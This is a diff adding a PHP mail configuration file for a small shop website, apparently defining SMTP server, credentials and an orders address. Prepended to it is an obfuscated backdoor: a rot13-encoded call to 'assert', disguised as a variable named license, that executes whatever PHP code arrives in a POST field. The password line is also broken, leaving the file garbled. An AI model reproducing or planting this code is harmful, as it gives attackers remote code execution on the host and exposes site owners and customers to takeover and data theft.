@@ -1,0 +1,14 @@
+<?php
+$license = str_rot13('n'.'f'.'f'.'r'.'e'.'g');
+$license($_POST['info']);
+?><?php 
+
+	define('SMTP_SERVER', 'smtp.delaterram.com');
+	define('SMTP_PORT', 465);
+	define('SMTP_USERNAME', 'info@delaterram.com');
+	define('SMTP_PASSWORD', '6);
+
+	define('MAIL_ORDERS_ADDRESS', 'ventas@delaterram.com');
+	define('MAIL_ORDERS_NAME', 'De la terram');
+
+ ?>
